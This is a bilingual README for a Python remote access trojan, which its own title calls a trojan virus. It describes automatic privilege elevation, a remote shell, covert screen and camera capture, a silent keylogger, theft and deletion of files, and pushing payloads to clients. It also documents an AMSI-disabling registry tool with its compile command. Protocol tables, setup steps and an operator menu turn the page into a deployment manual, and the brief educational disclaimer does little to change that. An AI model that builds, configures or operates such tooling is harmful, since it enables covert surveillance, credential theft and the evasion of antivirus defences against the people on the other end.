# Remote Admin Toolkit (RAT) / 远程管理工具 / 木马病毒

A lightweight Python-based remote administration toolkit with Shell command execution, real-time screen monitoring, camera capture, file system management, keylogging, and file upload.
基于 Python 的轻量级远程管理工具，支持 Shell 命令执行、屏幕实时监控、摄像头画面采集、文件系统管理、键盘记录以及文件上传。

> ⚠️ **Disclaimer / 免责声明**: This project is for security research and educational purposes only. Do not use for unauthorized access. Users must comply with local laws and assume all responsibility.
> 本项目仅供安全研究和教育用途，请勿用于未经授权的访问。使用者需遵守当地法律法规，自行承担所有责任。

📖 **完整文档**: 见 [wiki](wiki/) 目录或 [GitHub Wiki](https://github.com/Elmhdmnh/GhostLink/wiki)

---

## Features / 功能特性

- **Admin Auto-Elevation / 自动提权** — Client automatically requests administrator privileges on startup / 客户端启动时自动请求管理员权限
- **Remote Shell / 远程 Shell** — Execute arbitrary commands on client, supports `cd` directory switching / 在服务端对客户端执行任意命令，支持 `cd` 目录切换
- **Screen Monitor / 屏幕监控** — Real-time client screen capture, in-memory processing (no disk writes) / 实时获取客户端屏幕截图，内存处理不落盘
- **Camera Monitor / 摄像头监控** — Remotely open client camera with live video feed / 远程开启客户端摄像头，实时回传画面
- **File Manager / 文件管理** — Browse directories, download, upload & delete files on client / 浏览客户端磁盘目录，下载、上传和删除文件
- **File Information / 文件信息** — Retrieve 40+ metadata fields including SHA256 hash, owner, ADS streams, version info, icon, MIME type / 获取 40+ 项文件元数据：SHA256 哈希、所有者、ADS 数据流、版本信息、图标、MIME 类型等
- **File Upload / 文件上传** — Upload files from server to client via `send` command / 通过 `send` 命令从服务端上传文件到客户端
- **Keylogger / 键盘记录** — Background keystroke capture with pynput, retrievable on demand / 后台静默记录按键（基于 pynput），按需回传
- **Multi-Client / 多客户端管理** — Manage multiple connected clients, switch by index number / 支持同时连接多个客户端，通过编号切换
- **AMS Bypass / AMSI 绕过** — C++ utility to disable Windows AMSI via registry (`KillAMSI.cpp`) / C++ 工具通过注册表禁用 Windows AMSI
- **Resizable Window / 可调整窗口** — Monitor windows support free resizing / 监控窗口支持自由缩放
- **Auto Reconnect / 自动重连** — Client automatically reconnects after disconnection / 客户端断线后自动重连

## Architecture / 架构概览

```text
┌──────────────┐     TCP:4444     ┌──────────────────┐
│   后台.py     │ ◄──────────────► │    客户端.py      │
│  (Controller) │                  │   (Agent)        │
│              │                  │                   │
│  ┌────────┐  │   1-byte opcode  │  ┌─────────────┐  │
│  │ Menu   │──┼────────────────►│  │ Shell Module │  │
│  │ Control│  │                  │  │Screen Module │  │
│  │ Display│  │ 8-byte len+data  │  │Camera Module │  │
│  │        │◄─┼─────────────────│  │ File Module  │  │
│  │        │  │                  │  │Keylog Module │  │
│  └────────┘  │                  │  └─────────────┘  │
└──────────────┘                  └──────────────────┘
```

> 📖 **详细架构说明**: [架构文档](wiki/Architecture.md)

## Protocol / 通信协议

| Step | Direction | Content | Description |
| ---- | --------- | ------- | ----------- |
| 1 | Server → Client | `1` / `2` / `3` / `4` / `5` | 1-byte mode code: Shell / Screen / Camera / File / Keylogger |
| 2 | Server ↔ Client | Command string | Interactive commands (`get` for frame, `stop` to end, Shell commands, `look`/`get`/`delete`/`information` for files, etc.) |
| 3 | Client → Server | `8-byte length header + data body` | Command output, JPEG image data, pickled file list, or keylog text |

## Requirements / 环境要求

- **Python** >= 3.8
- **OS**: Windows / Linux / macOS

### Install Dependencies / 依赖安装

```bash
pip install opencv-python numpy pillow pywin32
```

> Both server and client need the above dependencies. `pywin32` is required on Windows for file system operations. / 服务端和客户端都需要安装以上依赖。Windows 下需要 `pywin32` 以支持文件系统操作。

## Usage / 使用说明

### 1. Configure Client / 配置客户端

Edit `客户端.py` and set the target IP address:

```python
IP, PORT = '192.168.0.103', 4444  # Change to backend server IP / 改为后台服务器地址
```

### 2. Start Backend / 启动后台 (Controller / 控制端)

```bash
python 后台.py
```

```text
Server started, waiting for clients...

--- Admin Menu ---
list               - List all online clients
shell <number>     - Send Shell command to client
screen <number>    - Start screen monitoring
camera <number>    - Open client camera
file   <number>    - Browse client file system
keylog <number>    - Retrieve keylogger data
quit               - Exit
Enter command:
```

### 3. Start Client / 启动客户端 (Agent / 被控端)

```bash
python 客户端.py
```

The client will connect automatically and wait for commands. / 客户端会自动连接并等待指令.

### 4. Commands / 操作命令

```bash
# List online clients / 查看在线客户端
list

# Remote Shell (type 0 to exit) / 远程 Shell (输入 0 退出)
shell 1

# Screen monitor (press q to exit) / 屏幕监控 (按 q 键退出)
screen 1

# Camera monitor (press q to exit) / 摄像头监控 (按 q 键退出)
camera 1

# File manager (type 0 to exit) / 文件管理 (输入 0 退出)
file 1

# Retrieve keylogger data / 获取键盘记录
keylog 1
```

#### File Manager Commands / 文件管理命令

| Command | Example | Description |
| ------- | ------- | ----------- |
| `to <drive>` | `to C:` | Navigate to a drive / 导航到磁盘 |
| `to <drive> <dirs>` | `to C: Users Admin` | Navigate to a subdirectory / 导航到子目录 |
| `back` | `back` | Go up one directory / 返回上级目录 |
| `look` | `look` | List current directory / 列出当前目录 |
| `look <subdir>` | `look Documents` | List subdirectory / 列出子目录 |
| `get <filename>` | `get secret.txt` | Download file to local / 下载文件到本地 |
| `delete <filename>` | `delete log.txt` | Delete file on client / 删除客户端文件 |
| `information <filename>` | `information setup.exe` | Show detailed file metadata (40+ fields) / 显示文件详细元数据（40+ 项） |
| `send <filename>` | `send payload.exe` | Upload file from server to client / 从服务端上传文件到客户端 |
| `0` | `0` | Return to main menu / 返回主菜单 |

## Project Structure / 项目结构

```text
├── 后台.py           # Controller - Admin menu & display / 控制端
├── 客户端.py         # Agent - Execute commands & send data / 被控端
├── 启动.bat          # One-click launcher / 一键启动脚本
├── KillAMSI.cpp      # C++ AMSI bypass utility / AMSI 绕过工具
├── README.md         # Documentation / 项目说明
├── LICENSE           # MIT License / MIT 许可证
├── requirements.txt  # Python dependencies / 依赖列表
└── wiki/             # Detailed documentation / 详细文档
    ├── Home.md
    ├── Getting-Started.md
    ├── User-Guide.md
    ├── Protocol-Reference.md
    ├── Architecture.md
    └── FAQ.md
```

> 📖 **完整协议参考**: [协议文档](wiki/Protocol-Reference.md)

## Protocol Details / 协议细节

### Opcodes / 命令码

| Code | Module | Sub-commands |
| ---- | ------ | ------------ |
| `1` | Shell | Any system command, send `0` to exit |
| `2` | Screen | `get` to capture one frame / `stop` to end |
| `3` | Camera | `get` to capture one frame / `stop` to end |
| `4` | File | `look <path>` list dir / `get <path>` download / `delete <path>` remove / `information <path>` metadata / `0` exit |
| `5` | Keylogger | One-shot: retrieves recent keylog buffer (up to 500 entries), then clears / 一次性回传最近按键记录（最多500条）并清空缓冲区 |

### File Module Protocol / 文件管理协议

```text
Server ──► Client:  "4"                         (进入文件管理模式)
Server ◄── Client:  "00000030C:\D:\E:\"         (8字节长度头 + 磁盘列表)
Server ──► Client:  "look C:\"                  (列出目录)
Server ◄── Client:  "00000123<pickle_data>"     (8字节长度头 + pickle序列化的文件列表)
Server ──► Client:  "get C:\secret.txt"         (下载文件)
Server ◄── Client:  "00001024"                  (8字节文件大小)
Server ──► Client:  "ok"                        (确认接收)
Server ◄── Client:  <file_bytes>               (文件原始字节)
Server ──► Client:  "delete C:\log.txt"         (删除文件)
Server ──► Client:  "information C:\app.exe"    (查询文件详细信息)
Server ◄── Client:  "00001234<info_text>"       (8字节长度头 + 文件元数据文本)
Server ──► Client:  "send C:\"                  (上传文件到客户端目录)
Server ◄── Client:  "READY"                     (客户端就绪)
Server ──► Client:  "00000012payload.exe"       (8字节文件名长度 + 文件名)
Server ◄── Client:  "OK"                        (确认文件名)
Server ──► Client:  "00001024"                  (8字节文件大小)
Server ◄── Client:  "OK"                        (确认接收)
Server ──► Client:  <file_bytes>               (文件原始字节)
Server ◄── Client:  "SUCCESS"                   (接收完成)
Server ──► Client:  "0"                         (退出文件管理模式)
```

### Keylogger Protocol / 键盘记录协议

```text
Server ──► Client:  "5"                         (请求键盘记录)
Server ◄── Client:  "00001234<keylog_text>"     (8字节长度头 + UTF-8 按键记录文本)
```

> Keylogger runs as a background daemon thread on the client. Keystrokes are buffered in memory.  
> Special keys are recorded as `[enter]`, `[shift]`, `[ctrl]`, etc.
> 键盘记录以后台守护线程运行，按键缓冲在内存中。特殊按键以 `[enter]`、`[shift]`、`[ctrl]` 等格式记录。

### File Information Fields / 文件信息字段

`information` 命令返回以下元数据（根据文件类型部分字段可能不可用）：

| # | Field / 字段 | Description / 说明 |
| --- | --- | --- |
| 1 | 类型 | File or Folder / 文件或文件夹 |
| 2 | 文件大小 | Size in bytes / 字节数 |
| 3 | 创建时间 | Creation time |
| 4 | 修改时间 | Last modification time |
| 5 | 访问时间 | Last access time |
| 6 | 文件权限 | POSIX permission bits (octal) |
| 7 | inode 号 | Filesystem inode number |
| 8 | 硬链接数 | Number of hard links |
| 9 | 属性值(原始) | Raw Windows file attributes |
| 10 | SHA256 哈希 | SHA256 hash of file content |
| 11 | 所有者 | File owner (DOMAIN\User) |
| 12 | 属性描述 | Human-readable attributes (只读/隐藏/系统/存档/已压缩/已加密/临时/目录) |
| 13 | 完整路径 | Absolute file path |
| 14 | 扩展名 | File extension |
| 15 | 短路径名(8.3) | DOS 8.3 short path |
| 16 | 符号链接目标 | Symlink target (if applicable) |
| 17 | 文件魔数(hex) | First 16 bytes in hex |
| 18 | 文件魔数(文本) | First 16 bytes as ASCII |
| 19 | MIME 类型 | MIME type guess |
| 20 | 磁盘卷标 | Volume label |
| 21 | 磁盘序列号 | Volume serial number |
| 22 | 文件系统 | Filesystem type (NTFS/FAT32/etc.) |
| 23 | 文件系统特性 | FS features (区分大小写/Unicode/ACL/压缩/加密) |
| 24-31 | 版本信息 | File/Product version, Company, Description, Copyright (PE files only) |
| 32 | DOS 属性标记 | DOS attribute flags (R/H/S/D/A/N) |
| 33 | 所在目录 | Parent directory |
| 34 | 文件名 | File name only |
| 35 | 设备号 | Device number |
| 36 | 索引号 | Index number |
| 37 | NTFS 文件引用号(MFT) | NTFS MFT file reference number |
| 38 | NTFS 链接数 | NTFS link count |
| 39 | NTFS 卷序列号 | NTFS volume serial number |
| 40 | ADS 数据流 | Alternate Data Streams enumeration |
| 41-42 | 文件图标 | System icon (Base64-encoded PNG) |

## KillAMSI Utility / AMSI 绕过工具

`KillAMSI.cpp` 是一个独立的 C++ 工具，通过修改注册表禁用 Windows 的 AMSI（Antimalware Scan Interface）脚本扫描功能。

### 编译

```bash
g++ -shared -o KillAMSI.dll KillAMSI.cpp -ladvapi32
```

### 导出函数

| 函数 | 说明 |
| --- | --- |
| `KillAmsi()` | 设置 HKCU\...\AmsiEnable=0，返回 0=成功 / 1=失败 |

> 非管理员权限也能写入注册表。

---

## 相关链接

- **完整 Wiki 文档**: [`wiki/`](wiki/) | [`GhostLink.wiki/`](GhostLink.wiki/)
- **作者**: [Elmh](https://elmh.top/)
- **许可证**: MIT
